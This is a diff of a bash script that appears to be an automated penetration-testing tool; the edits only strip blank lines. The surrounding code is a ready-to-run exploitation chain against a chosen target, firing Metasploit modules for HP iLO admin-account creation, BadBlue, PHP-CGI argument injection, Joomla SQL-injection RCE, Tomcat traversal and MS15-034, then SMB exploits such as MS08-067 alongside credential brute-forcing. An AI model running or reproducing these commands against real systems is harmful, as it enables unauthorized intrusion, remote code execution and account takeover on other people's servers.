@@ -626,69 +626,45 @@ if [ "$MODE" = "webporthttp" ]; then
     fi
     cd $INSTALL_DIR
 
-
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED ENUMERATING WEB SOFTWARE $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     clusterd -i $TARGET -p $PORT
-
 
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING WEBDAV SCANNER $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use scanner/http/webdav_scanner; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; run; use scanner/http/webdav_website_content; run; exit;"
 
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING APACHE OPTIONS BLEED EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use scanner/http/apache_optionsbleed; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; set SSL false; run; exit;"
-
-
 
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING HP ILO AUTH BYPASS EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;"
 
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING MS15-034 SYS MEMORY DUMP METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS \"$TARGET\"; set RPORT 80; set WAIT 2; run; exit;"
-
-
-
-
 
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING BADBLUE PASSTHRU METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use exploit/windows/http/badblue_passthru; setg RHOST \"$TARGET\"; set RPORT 80; run; back;exit;"
 
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING PHP CGI ARG INJECTION METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use exploit/multi/http/php_cgi_arg_injection; setg RHOST \"$TARGET\"; set RPORT 80; run; back;exit;"
 
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING JOOMLA COMFIELDS SQL INJECTION METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use unix/webapp/joomla_comfields_sqli_rce; setg RHOST \"$TARGET\"; set RPORT 80; set SSL false; run; back;exit;"
-    
-
 
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOIT $RESET"
@@ -887,21 +863,11 @@ if [ "$MODE" = "webporthttps" ]; then
     cat $PLUGINS_DIR/dirsearch/reports/$TARGET/* > $LOOT_DIR/web/dirsearch-$TARGET.txt 2> /dev/null
     wget https://$TARGET:$PORT/robots.txt -O $LOOT_DIR/web/robots-$TARGET:$PORT-https.txt 2> /dev/null
 
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED ENUMERATING WEB SOFTWARE $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     clusterd --ssl -i $TARGET -p $PORT
     
-
-
-
-
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING WORDPRESS VULNERABILITY SCAN $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -923,76 +889,45 @@ if [ "$MODE" = "webporthttps" ]; then
     fi
     cd $INSTALL_DIR
 
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING WEBDAV SCANNER $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use scanner/http/webdav_scanner; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL true; run; use scanner/http/webdav_website_content; run; exit;"
-
-
 
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING APACHE TOMCAT UTF8 TRAVERSAL EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use admin/http/tomcat_utf8_traversal; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;"
 
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING APACHE OPTIONS BLEED EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use scanner/http/apache_optionsbleed; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;"
-
-
-
-
 
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING HP ILO AUTH BYPASS EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;"
 
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING MS15-034 SYS MEMORY DUMP METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS \"$TARGET\"; set RPORT "$PORT"; set SSL true; set WAIT 2; run; exit;"
-
-
-
-
 
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING BADBLUE PASSTHRU METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use exploit/windows/http/badblue_passthru; setg RHOST \"$TARGET\"; set RPORT "$PORT"; set SSL true; run; back; exit;"
 
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING PHP CGI ARG INJECTION METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use exploit/multi/http/php_cgi_arg_injection; setg RHOST \"$TARGET\"; set RPORT "$PORT"; set SSL true; run; back; exit;"
-    
-
-
 
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING JOOMLA COMFIELDS SQL INJECTION METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use unix/webapp/joomla_comfields_sqli_rce; setg RHOST \"$TARGET\"; set RPORT "$PORT"; set SSL true; run; back; exit;"
-
-
-
-
 
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOIT $RESET"
@@ -1986,10 +1921,6 @@ else
     echo -e "$OKRED ENUMERATING WEB SOFTWARE $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     clusterd -i $TARGET
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING WORDPRESS VULNERABILITY SCAN $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -2010,75 +1941,39 @@ else
       echo -e "${OKGREEN}====================================================================================${RESET}"
       nikto -h http://$TARGET -output $LOOT_DIR/web/nikto-$TARGET-http.txt
     fi
-
-
-    
     cd $INSTALL_DIR
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING WEBDAV SCANNER $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use scanner/http/webdav_scanner; setg RHOSTS "$TARGET"; setg RPORT "80"; setg SSL false; run; use scanner/http/webdav_website_content; run; exit;"
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING APACHE TOMCAT UTF8 TRAVERSAL EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use admin/http/tomcat_utf8_traversal; setg RHOSTS "$TARGET"; setg RPORT "80"; set SSL false; run; exit;"
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING APACHE OPTIONS BLEED EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use scanner/http/apache_optionsbleed; setg RHOSTS "$TARGET"; setg RPORT "80"; set SSL false; run; exit;"
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING HP ILO AUTH BYPASS EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RPORT "80"; set SSL false; run; exit;"
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING MS15-034 SYS MEMORY DUMP METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS \"$TARGET\"; set RPORT 80; set WAIT 2; run; exit;"
-
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING BADBLUE PASSTHRU METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use exploit/windows/http/badblue_passthru; setg RHOST \"$TARGET\"; set RPORT 80; run; back;exit;"
-
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING PHP CGI ARG INJECTION METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use exploit/multi/http/php_cgi_arg_injection; setg RHOST \"$TARGET\"; set RPORT 80; run; back;exit;"
-
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING JOOMLA COMFIELDS SQL INJECTION METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use unix/webapp/joomla_comfields_sqli_rce; setg RHOST \"$TARGET\"; set RPORT 80; set SSL false; run; back;exit;"
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -2294,10 +2189,6 @@ else
     echo -e "$OKRED ENUMERATING WEB SOFTWARE $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     clusterd --ssl -i $TARGET
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING WORDPRESS VULNERABILITY SCAN $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -2318,79 +2209,38 @@ else
       nikto -h https://$TARGET -output $LOOT_DIR/web/nikto-$TARGET-https.txt
     fi
     cd $INSTALL_DIR
-
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING WEBDAV SCANNER $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use scanner/http/webdav_scanner; setg RHOSTS "$TARGET"; setg RPORT "443"; setg SSL true; run; use scanner/http/webdav_website_content; run; exit;"
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING APACHE TOMCAT UTF8 TRAVERSAL EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use admin/http/tomcat_utf8_traversal; setg RHOSTS "$TARGET"; setg RPORT "443"; set SSL true; run; exit;"
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING APACHE OPTIONS BLEED EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use scanner/http/apache_optionsbleed; setg RHOSTS "$TARGET"; setg RPORT "443"; set SSL true; run; exit;"
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING HP ILO AUTH BYPASS EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RPORT "443"; set SSL true; run; exit;"
-
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING MS15-034 SYS MEMORY DUMP METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS \"$TARGET\"; set RPORT 443; set SSL true; set WAIT 2; run; exit;"
-
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING BADBLUE PASSTHRU METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use exploit/windows/http/badblue_passthru; setg RHOST \"$TARGET\"; set RPORT 443; set SSL true; run; back;exit;"
-
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING PHP CGI ARG INJECTION METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use exploit/multi/http/php_cgi_arg_injection; setg RHOST \"$TARGET\"; set RPORT 443; set SSL true; run; back;exit;"
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING JOOMLA COMFIELDS SQL INJECTION METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use unix/webapp/joomla_comfields_sqli_rce; setg RHOST \"$TARGET\"; set RPORT 443; set SSL true; run; back;exit;"
-
-
-
-
-
-
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -2464,13 +2314,6 @@ else
   python $SAMRDUMP $TARGET
   nbtscan $TARGET
   nmap -A -sV -Pn -T5 -p445 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smb-protocols --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET
-  
-
-
-
-
-
-
   msfconsole -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/smb/smb_version; run; use auxiliary/scanner/smb/pipe_auditor; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use exploit/windows/smb/ms06_040_netapi; run; use exploit/windows/smb/ms05_039_pnp; run; use exploit/windows/smb/ms10_061_spoolss; run; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_ms17_010; run; exit;"
 fi
 
